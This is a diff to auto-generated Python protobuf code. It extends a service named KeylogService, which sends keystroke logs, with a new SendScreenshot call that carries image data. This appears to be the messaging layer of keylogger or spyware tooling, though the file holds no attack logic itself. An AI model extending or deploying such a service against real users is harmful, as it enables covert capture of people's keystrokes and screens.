@@ -24,7 +24,7 @@ _sym_db = _symbol_database.Default()
 
 
 
-DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x0cserver.proto\" \n\rKeylogRequest\x12\x0f\n\x07message\x18\x01 \x01(\t\"\"\n\x0eKeylogResponse\x12\x10\n\x08response\x18\x01 \x01(\x08\x32>\n\rKeylogService\x12-\n\nSendKeylog\x12\x0e.KeylogRequest\x1a\x0f.KeylogResponseb\x06proto3')
+DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x0cserver.proto\" \n\rKeylogRequest\x12\x0f\n\x07message\x18\x01 \x01(\t\"\"\n\x0eKeylogResponse\x12\x10\n\x08response\x18\x01 \x01(\x08\"9\n\x11ScreenshotRequest\x12\x10\n\x08\x66ilename\x18\x01 \x01(\t\x12\x12\n\nimage_data\x18\x02 \x01(\x0c\"6\n\x12ScreenshotResponse\x12\x0f\n\x07success\x18\x01 \x01(\x08\x12\x0f\n\x07message\x18\x02 \x01(\t2y\n\rKeylogService\x12-\n\nSendKeylog\x12\x0e.KeylogRequest\x1a\x0f.KeylogResponse\x12\x39\n\x0eSendScreenshot\x12\x12.ScreenshotRequest\x1a\x13.ScreenshotResponseb\x06proto3')
 
 _globals = globals()
 _builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
@@ -35,6 +35,10 @@ if not _descriptor._USE_C_DESCRIPTORS:
   _globals['_KEYLOGREQUEST']._serialized_end=48
   _globals['_KEYLOGRESPONSE']._serialized_start=50
   _globals['_KEYLOGRESPONSE']._serialized_end=84
-  _globals['_KEYLOGSERVICE']._serialized_start=86
-  _globals['_KEYLOGSERVICE']._serialized_end=148
+  _globals['_SCREENSHOTREQUEST']._serialized_start=86
+  _globals['_SCREENSHOTREQUEST']._serialized_end=143
+  _globals['_SCREENSHOTRESPONSE']._serialized_start=145
+  _globals['_SCREENSHOTRESPONSE']._serialized_end=199
+  _globals['_KEYLOGSERVICE']._serialized_start=201
+  _globals['_KEYLOGSERVICE']._serialized_end=322
 # @@protoc_insertion_point(module_scope)
